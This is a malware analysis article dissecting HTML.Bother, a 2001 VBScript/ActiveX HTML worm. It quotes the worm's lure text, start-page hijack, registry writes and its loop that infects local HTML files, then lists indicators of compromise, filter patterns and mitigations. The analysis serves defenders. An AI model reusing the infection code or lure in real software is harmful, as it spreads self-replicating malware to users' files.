# Dissecting HTML.Bother: An ActiveX-Driven HTML Worm 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
HTML.Bother (dated May 2001) is a compact HTML-based worm that executes VBScript within Internet Explorer (IE) when ActiveX/VBScript is enabled. Rather than relying on exploits, it leans on the permissive defaults of the era: scripts running in the Local Machine or Internet zone could access the filesystem and registry via Windows Script Host (WSH) objects. The page masquerades as a “patch” notice, urging users to accept ActiveX. Once executed, it alters browser settings, drops decoy files, and infects other HTML files by prepending a marker and embedding the worm’s own HTML/VBScript.

This sample is a clear example of social engineering combined with client-side scripting. Analyzing the source reveals deterministic paths, registry keys, and string markers defenders can use to detect and remediate infections, even on legacy systems or archived environments.

## Overview of the Malware 🐛
HTML.Bother’s goals are to persist through browser configuration changes and to replicate by infecting local HTML content that a user may later open or share.

- Execution context: An HTML page with inline VBScript executed by IE when ActiveX/VBScript is enabled. A red notice in the body nudges users to accept ActiveX.
- Browser hijack: Captures the current IE Start Page, then replaces it with a locally created `PetiK.htm` in the system directory. That page embeds the original start page via an IFRAME and displays messaging (“you have my worm”).
- Local file infection: Iterates target folders (“My Documents” of the default user and `Windows\Web`) and prepends a `<bother>` marker before original HTML; appends an author tag and the worm’s own body HTML (including the script), turning those files into carriers.
- Cosmetic changes: Creates a `Hello.txt` on the desktop as a calling card; on a random day of the month, attempts to change the default icon for `.html` files via `HKEY_CLASSES_ROOT\htmlfile\DefaultIcon`.
- Error tolerance: `On Error Resume Next` suppresses exceptions, allowing partial execution even if some objects, paths, or registry keys are unavailable.

There is no command-and-control (C2) or network beaconing. Propagation relies on users opening infected HTML files locally or sharing them.

## Source Code Analysis 🔬
The page begins with a simple decoy and then declares VBScript that performs filesystem and registry operations through WSH automation objects.

### Initialization and Decoy
```html
<font ...>You need ActiveX enabled if you want to see this page.
Please open this page again and click accept ActiveX.<br>Internet Explorer</font>
```
- Social engineering: prompts users to enable ActiveX so the script can run.

```vb
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set ws  = CreateObject("WScript.Shell")
```
- Broad error suppression and creation of the two core automation objects.

### Desktop Dropper
```vb
bureau = ws.RegRead("HKEY_USERS\.DEFAULT\...\Shell Folders\Desktop")
Set txt = fso.CreateTextFile(bureau & "\Hello.txt")
txt.WriteLine "HTML.Bother by PetiK (06/05/2001)"
txt.WriteLine "A HTML.Worm made in France"
txt.Close
```
- Writes a harmless text file to the Default User’s Desktop folder as a visible artifact.

### Start Page Hijack and Local Landing Page
```vb
start = ws.RegRead("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")
If start <> fso.GetSpecialFolder(1) & "\PetiK.htm" Then
  Set htm = fso.CreateTextFile(fso.GetSpecialFolder(1) & "\PetiK.htm", 2)
  htm.WriteLine "<html><head><title>HTML.Bother</title>"
  htm.WriteLine "<body><IFRAME SRC='" & start & "'></IFRAME>"
  htm.WriteLine "<font face='verdana' color=blue size='2'>"
  htm.WriteLine "<br><br>Hi, you have my Worm."
  htm.WriteLine "<br>It's not dangerous."
  htm.WriteLine "<br>Contact Symantec Corporation (...) to disinfect your computer"
  htm.WriteLine "</body></html>"
  htm.Close
  ws.RegWrite "HKCU\...\Start Page", fso.GetSpecialFolder(1) & "\PetiK.htm"
End If
```
- Captures the current start page URL, creates `PetiK.htm` in the System folder, embeds the previous start page inside an IFRAME, and sets IE’s Start Page to this local file. This anchors persistence-like behavior through the browser UI.

### Random Day Icon Tweak
```vb
p = Int(Rnd * 30) + 1
If Day(Now()) = p Then
  WshShell.RegWrite "HKCR\htmlfile\DefaultIcon\", fso.GetSpecialFolder(1) & "\SHELL32.dll,69"
End If
```
- With a 1-in-30 likelihood (matching the current day), the worm attempts to change the default icon for HTML files. Note the variable mismatch: `WshShell` is never declared (the object is `ws`), so under strict conditions this would fail; error suppression hides the failure.

### HTML File Infection (Prepender)
The core replication loop targets two locations: the Default user’s “Personal” (My Documents) and `Windows\WEB`.

```vb
Set FolderObj = fso.GetFolder(doc)        ' doc from HKU\.DEFAULT ...\Personal
For Each cible In FolderObj.Files
  ExtName = LCase(fso.GetExtensionName(cible.Name))
  If ExtName = "htm" Or ExtName = "html" Then
    Set vrai = fso.OpenTextFile(cible.Path, 1, False)
    If vrai.ReadLine <> "<bother>" Then
      vrai.Close
      Set vrai = fso.OpenTextFile(cible.Path, 1, False)
      htmorg = vrai.ReadAll
      vrai.Close
      Set virus = document.body.createTextRange
      Set vrai = fso.CreateTextFile(cible.Path, True, False)
      vrai.WriteLine "<bother>"
      vrai.Write htmorg
      vrai.WriteLine "<bother par PetiK May 9th 2001>"
      vrai.WriteLine virus.htmlText
      vrai.Close
    Else
      Real.Close   'typo; should be vrai.Close
    End If
  End If
Next
```
- Detection mark: The first line `<bother>` is used as an infection marker to avoid reinfecting the same file.
- Payload: Reads the original HTML, then rewrites the file as: marker + original content + author tag + the current page’s body HTML. Because the worm’s `<script language=VBScript>...</script>` block resides inside the `<body>` of the original page, `virus.htmlText` effectively appends the worm’s code into the target file.
- Robustness issues: Typo `Real.Close` and the earlier `WshShell` mismatch would raise errors, but `On Error Resume Next` allows the rest to continue. Variable name case (`FSO` vs `fso`) is benign in VBScript (case-insensitive).
- Second pass: The code repeats the same infection logic against `Windows\WEB`, a folder used by classic Windows shell web content.

### Observations
- No network C2 or data exfiltration. All actions are local registry and filesystem changes.
- Persistence is “soft,” riding on the Start Page and the chance users open infected local HTML files.
- The script requires ActiveX/VBScript to be enabled in IE; if blocked, it becomes inert.

## Mitigation and Defense Strategies 🛡️
- Disable VBScript/ActiveX in IE: Enforce Group Policy to disable VBScript in Internet and Local Machine zones, or block ActiveX entirely. Modern Windows versions already deprecate VBScript in IE; ensure legacy systems are aligned.
- Browser hardening: Use Protected Mode/Enhanced Protected Mode and restricted zones. Prevent file and registry access from the browser’s scripting engine.
- Email/web gateway filtering: Quarantine HTML attachments that contain `<script language=VBScript>` or references to `CreateObject("Scripting.FileSystemObject")`/`WScript.Shell`. Sanitize inbound HTML by removing ActiveX, VBScript, and `document.body.createTextRange` constructs.
- IOC-based detection: Search for files beginning with the literal `<bother>` line or containing the footer tag `<bother par PetiK May 9th 2001>`. Look for `PetiK.htm` in the System directory and `Hello.txt` on Desktop. Monitor `HKCU\Software\Microsoft\Internet Explorer\Main\Start Page` for local file paths and `HKCR\htmlfile\DefaultIcon` changes.
- EDR telemetry: Alert when browser processes (e.g., `iexplore.exe`) create or rewrite `.htm/.html` files under user profile paths or `Windows\Web`. Flag registry writes from browser context to IE start page keys.
- Least privilege and application control: Run browsers as standard users and enforce application whitelisting to block arbitrary script execution. Consider disabling `wscript.exe/cscript.exe` for non-admin users where business requirements allow.
- Incident response steps: Restore the original Start Page, revert `htmlfile` DefaultIcon if modified, remove `PetiK.htm`, delete or clean infected HTML files by removing the `<bother>` header/footer and embedded script, and clear the desktop dropper `Hello.txt`.

## Conclusion
HTML.Bother illustrates how legacy IE features and VBScript/ActiveX could be combined for local replication and mild persistence without any exploit. Its design centers on manipulating the Start Page, dropping a local landing page, and prepending its code into existing HTML files in user and system web folders. For defenders, deterministic markers (`<bother>` lines, `PetiK.htm`, registry keys) and the dependency on browser scripting provide clear detection and containment opportunities. In modern environments, disabling VBScript/ActiveX and applying strong browser sandboxing largely neutralize this class of threat; on legacy systems, layered controls and targeted IOCs are essential for timely detection and cleanup.
